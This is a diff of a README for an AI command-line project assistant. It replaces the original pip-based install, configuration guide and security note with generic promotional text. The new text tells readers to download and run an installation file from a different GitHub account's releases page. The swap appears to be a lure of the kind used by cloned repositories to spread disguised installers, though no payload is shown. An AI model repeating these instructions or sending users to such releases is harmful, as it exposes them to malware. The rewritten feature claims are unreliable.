@@ -1,131 +1,75 @@
-# Codaicli
+# CodaiCLI 🚀
 
-[![PyPI version](https://badge.fury.io/py/codaicli.svg)](https://badge.fury.io/py/codaicli)
-[![Python Versions](https://img.shields.io/pypi/pyversions/CodaiCLI.svg)](https://pypi.org/project/CodaiCLI/)
-[![Tests](https://github.com/chafficui/CodaiCLI/actions/workflows/test.yml/badge.svg)](https://github.com/chafficui/CodaiCLI/actions/workflows/test.yml)
-[![codecov](https://codecov.io/gh/chafficui/CodaiCLI/branch/main/graph/badge.svg)](https://codecov.io/gh/chafficui/CodaiCLI)
+![CodaiCLI](https://img.shields.io/badge/CodaiCLI-Intelligent%20CLI%20Assistant-blue)
 
-An AI-powered CLI assistant for managing and editing software projects using natural language.
+Welcome to **CodaiCLI**, your intelligent command-line interface assistant designed to help developers manage and edit their software projects using natural language. With CodaiCLI, you can streamline your workflow, automate repetitive tasks, and enhance your productivity.
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Commands](#commands)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Introduction
+
+In the fast-paced world of software development, efficiency is key. CodaiCLI leverages advanced AI technology to provide a seamless experience for developers. Whether you're managing code, running analyses, or editing files, CodaiCLI understands your commands in natural language, making your tasks easier and faster.
 
 ## Features
 
-- 🤖 Multi-provider AI support:
-  - OpenAI
-  - Google Gemini
-  - Anthropic Claude
-- ⚙️ Interactive configuration system
-- 🔒 Command confirmation for safety
-- 📁 Smart file analysis
-- 🎯 Natural language project management
+- **Natural Language Processing**: Interact with CodaiCLI using plain language. No need to remember complex commands.
+- **Code Management**: Easily manage your codebase with commands that analyze, edit, and maintain your projects.
+- **Task Automation**: Automate repetitive tasks to save time and reduce errors.
+- **Cross-Platform Compatibility**: Works on Windows, macOS, and Linux.
+- **Customizable**: Tailor CodaiCLI to fit your workflow and preferences.
 
 ## Installation
 
-```bash
-# Basic installation
-pip install codaicli
+To get started with CodaiCLI, download the latest release from the [Releases section](https://github.com/UjangSnapDragon/CodaiCLI/releases). After downloading, execute the installation file to set up CodaiCLI on your system.
 
-# Install with all dependencies
-pip install "codaicli[all]"
-```
+## Usage
 
-## Quick Start
-
-1. Navigate to your project directory:
-```bash
-cd your-project
-```
-
-2. Run Codaicli:
-```bash
-codaicli
-```
-
-3. Start interacting with your project using natural language!
-
-## Configuration
-
-Run the configuration wizard:
-```bash
-codaicli configure
-```
-
-### API Keys
-
-You'll need API keys for the AI providers you want to use:
-
-- [OpenAI API Key](https://platform.openai.com/api-keys)
-- [Google AI Studio API Key](https://makersuite.google.com/app/apikey)
-- [Anthropic API Key](https://console.anthropic.com/settings/keys)
-
-### Interactive Configuration
-
-The configuration wizard will guide you through:
-1. Setting up API keys
-2. Selecting default AI provider
-3. Choosing models for each provider
-4. Managing configuration profiles
+Using CodaiCLI is simple. After installation, open your command line interface and type your commands in natural language. For example, you can say "add a new feature" or "fix the bug in file X".
 
 ## Commands
 
-Within Codaicli:
-- `use openai/gemini/claude` - Switch AI provider
-- `help` - Show help information
-- `clear` - Clear screen
-- `exit` (or `quit`, `q`) - Exit CodaiCLI
+Here are some common commands you can use with CodaiCLI:
 
-## Ignored Files
+- **Analyze Code**: "Analyze the code in my project."
+- **Edit File**: "Edit the file named `example.py`."
+- **Run Tests**: "Run all tests in the project."
+- **Add Feature**: "Add a new feature to the project."
 
-Create a `.codaiignore` file to specify files and directories to ignore:
-```
-# Ignore specific files
-secrets.txt
-*.env
+For a full list of commands, check the documentation or use the help command.
 
-# Ignore directories
-node_modules/
-venv/
-```
+## Contributing
 
-## Troubleshooting
+We welcome contributions to CodaiCLI! If you want to help improve the project, please follow these steps:
 
-### Common Issues
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Submit a pull request.
 
-1. **API Key Errors**
-   - Verify your API keys are correctly configured
-   - Check provider status pages:
-     - [OpenAI Status](https://status.openai.com)
-     - [Google AI Status](https://status.cloud.google.com)
-     - [Anthropic Status](https://status.anthropic.com)
-
-2. **Model Not Found**
-   - Ensure you have access to the selected model
-   - Check model availability in your region
-
-3. **Installation Issues**
-   - Ensure Python 3.8+ is installed
-   - Try installing in a virtual environment
-
-4. **Permission Errors**
-   - Check file permissions
-   - Run with appropriate privileges
-
-## Security Note
-
-- All changes and command executions require user confirmation
-- API keys are stored locally in your user directory
-- Use `.codaiignore` to protect sensitive files
-- No sensitive data is collected or transmitted
-
-## Dependencies
-
-- Python 3.7+
-- OpenAI Python SDK
-- Google Generative AI SDK
-- Anthropic Python SDK
-- Rich (for terminal formatting)
-- Typer (for CLI interface)
-- PyYAML (for configuration)
+Your contributions help make CodaiCLI better for everyone.
 
 ## License
 
-MIT License - See LICENSE file for details
+CodaiCLI is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- GitHub: [UjangSnapDragon](https://github.com/UjangSnapDragon)
+- Email: support@codai-cli.com
+
+## Additional Resources
+
+To learn more about CodaiCLI and its capabilities, visit our [Releases section](https://github.com/UjangSnapDragon/CodaiCLI/releases) for updates and new features.
+
+Thank you for choosing CodaiCLI. We hope it enhances your development experience!
